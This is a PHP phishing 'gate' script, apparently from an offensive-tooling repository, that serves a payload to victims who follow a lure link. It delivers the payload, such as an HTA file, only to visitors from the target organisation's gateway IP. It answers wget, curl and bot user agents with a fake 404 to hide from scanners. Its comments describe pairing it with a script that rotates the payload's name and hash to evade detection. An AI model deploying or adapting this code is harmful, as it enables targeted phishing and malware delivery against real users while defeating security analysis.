<?php
/* 
PHP gate version 1.0

Use case: Phish users with the gate URI example https://rewardspointsforyou[.]com/Rewarded.php?id=CompanyName_or_UserName
Note: if you are using usernames, consider only checking for id presence and not the string "test".  Alternatively, you could feed this a list of valid strings.

Consider using the script "payload_changer.py" from the same repo with this gate. 
It changes the value of payloadinitialized with your payload and changes it on a timed basis.  
The payload will have the name changed and the hash modified by the insertion of an html comment every X number of seconds.

IMPORTANT NOTE!!! If you are hosting this on a server using CloudFlare DNS, make sure you turn off Traffic Routing!!!  
If you do not, the IP check will fail since all traffic will be from a CloudFlare source IP and not your target organizations Gateway !!!!!!!!!!!!!!!!!!!!!
*/

/* Modify "winner" with whatever you want, such as b64 encoded targeted user, the orgs name, etc */
if(isset($_GET['id']) && $_GET['id'] == "winner") {
  /* Put your target gateway IP address in here. This is simple regex so use three octets if they own a public /24, etc. */
  /* If you are unsure of gateway IP addresses due to VPN access, etc, consider using the alternate gate file (useragent_gate.php) which just blocks certain user agents */
    if(preg_match("/192.168.0/", $_SERVER['REMOTE_ADDR'])) {

        if(preg_match("/wget/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");
        }
        elseif(preg_match("/curl/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/bot/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
/* Modify "payloadinitialized" string to be your guarded file (payload.hta, etc) UNLESS you are using this with payload_changer.py.  
If you are using it with the python script you will enter it with the -p parameter. */
        else { 
        header("Location: payloadinitialized");
        }
    }
    else {
        header("HTTP/1.0 404 Not Found");     
      }
      exit;
  }
  else {
    header("HTTP/1.0 404 Not Found");     
  }
  exit;
?>


